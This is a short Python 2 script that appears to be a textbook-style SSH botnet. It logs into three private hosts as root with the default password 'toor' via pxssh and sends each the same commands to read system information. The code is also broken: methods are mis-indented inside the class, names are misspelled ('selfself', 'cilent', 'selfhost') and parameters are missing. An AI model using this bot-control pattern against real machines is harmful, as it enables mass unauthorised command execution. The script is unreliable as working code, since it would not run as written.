import optparse
import pxssh
class Client:
    def __init__(self,host,user,password):
        self.host = host
        self.user=  user
        self.password = password
        self.session = self.connect()
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception,e:
            print e
            print '[-] Error Connecting'
    def  send_command(selfself,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.prompt()
    def botnetCommand(command):
        for cilent in botNet:
            output = client.send_command(command)
            print '[*] Output from '+client.host
            print '[+]'+output+'\n'
    def addCilent(selfhost,user,password):
        client = Client(host,user,password)
        botNet.append(client)
    botNet = []
    addCilent('10.10.10.110','root','toor')
    addCilent('10.10.10.120','root','toor')
    addCilent('10.10.10.130','root','toor')
    botnetCommand('uname -v')
    botnetCommand('cat /etc/issue')